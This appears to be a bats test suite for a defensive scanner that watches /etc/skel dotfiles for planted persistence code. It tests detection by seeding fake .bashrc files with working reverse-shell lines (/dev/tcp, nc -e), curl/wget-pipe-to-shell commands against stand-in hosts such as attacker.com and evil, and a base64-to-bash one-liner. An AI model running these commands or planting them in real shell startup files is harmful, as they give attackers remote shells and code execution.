#!/usr/bin/env bats
# L2 bats functional tests for the skel-watchdog scan script.
#
# /etc/skel is copied into every NEW user's home at account creation, so a
# planted dotfile (.bashrc, .profile, …) becomes the login-shell rc of every
# future user — delayed, per-new-user code execution (T1546.004 family). A
# skel file that is world-writable / non-root-owned, or contains a
# command-injection pattern, is alert. The scan recurses (find -type f), so
# hidden dotfiles are covered.
#
# Run with: bats packaging/test/L2-skel-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd/skel-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SKELD="${TMP}/skel"; mkdir -p "${SKELD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SKEL_PROFILE="${PROFILE:-report}" \
    SELFDEF_SKEL_BASELINE="${BASELINE}" \
    SELFDEF_SKEL_DIRS="${DIRS_V:-$SKELD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/bin"\n' > "${SKELD}/.bashrc"
}

@test "no skel dir → ok / no_skel" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_skel"'
    cap | grep -q '"severity":"ok"'
}

@test "benign skel dotfile, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged skel on second run → ok / skel_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a skel dotfile with an injection pattern → alert / skel_suspicious" {
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable skel dotfile → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign skel change → warn / skel_changed" {
    seed_benign
    run_wd
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/sbin"\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"skel_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned skel dotfile is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious skel dotfile" {
    seed_benign
    run_wd
    printf '# .bashrc\ncurl http://evil/p|sh\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — skel inventory enumerates new-user-rc-template surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\nwget -qO- http://attacker/p | sh\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable skel dotfile): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable skel dotfile): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${SKELD}/.bashrc"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (recursion into subdir): hidden dotfile in skel subdir is scanned (find -type f recurses)" {
    seed_benign
    mkdir -p "${SKELD}/.config"
    printf '# config-init\nbash -i >& /dev/tcp/9.9.9.9/4444 0>&1\n' > "${SKELD}/.config/init"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "DELTA detect — ADDED skel dotfile (attacker drops a new .profile) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# distinctive-attacker\necho new\n' > "${SKELD}/.distinctive-attacker-profile"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-skel -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): skel-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546.004 per-new-user code-execution persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"skel_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport PATH="$PATH:/usr/local/bin"\n' > "${SKELD}/.bashrc"
    run_wd
    ! cap | grep -q '"event":"skel_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/skel + /etc/skel.alt axes — injection in EITHER → alert)" {
    SKELD2="${TMP}/skel.alt"; mkdir -p "${SKELD2}"
    seed_benign
    DIRS_V="${SKELD} ${SKELD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD2}/.bashrc"
    DIRS_V="${SKELD} ${SKELD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\ncurl -s http://attacker.com/p | bash\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in skel dotfile: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks nc reverse-shell
    # variant INVARIANTs across the brain. Lock the netcat axis on the
    # /etc/skel per-new-user-rc-template persistence surface (T1546.004
    # — skel dotfiles become the login-shell rc of every future user).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
